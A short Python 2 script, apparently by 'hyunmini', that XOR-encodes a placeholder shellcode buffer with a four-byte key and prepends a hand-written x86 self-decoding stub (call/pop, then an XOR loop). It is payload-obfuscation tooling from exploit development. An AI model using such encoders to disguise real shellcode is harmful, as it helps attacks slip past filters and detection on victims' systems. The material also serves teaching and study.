import os,sys

print " * Simple XOR Shellcode Encoder by hyunmini * \n"

def xor(data):
    key = "\x01\x02\x03\x04"
    leng = len(key)
    xor1 = ""
    reverse = ""
    for i in range(0, len(data)):
    	reverse += chr(ord(data[i]) ^ ord(key[i % leng]))
    	if (i+1) % 4 == 0:
    		reverse = reverse[::-1]
    		xor1 += reverse
    		reverse = ''
    return xor1

def conv_hex(data):
	hex_str = ""
	for i in range(0, len(data)):
		hex_str += hex(ord(data[i])).replace('0x','\\x')
	return hex_str

org_shellcode = (
	"\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44"
	"\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44"
	"\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44"
	"\x41\x41\x41\x41\x00\x00\x00\x00\x43\x43\x43\x43\x44\x44\x44\x44"
)

xor_shellcode = ""

decoder = (
	"\xe8\xff\xff\xff\xff"         # call+4
	"\xc2"                    # ret(\xff\xc2 = nop)
	"\x5e"			 # pop esi
	"\x6a\x20\x59"		 # push 20, pop ecx
	"\xbf\x01\x02\x03\x04"	 # mov edi, xor_key
	"\x31\x7e\x12"		 # xor [esi+12], edi
	"\x83\xc6\x04"		 # add esi, 4
	"\xe2\xf8"		 # loop xor
)
xor_shellcode = xor(org_shellcode)
print "Orginal : " + conv_hex(org_shellcode) + '\n'
print "Encoded : " + conv_hex(decoder)+conv_hex(xor_shellcode) + '\n'
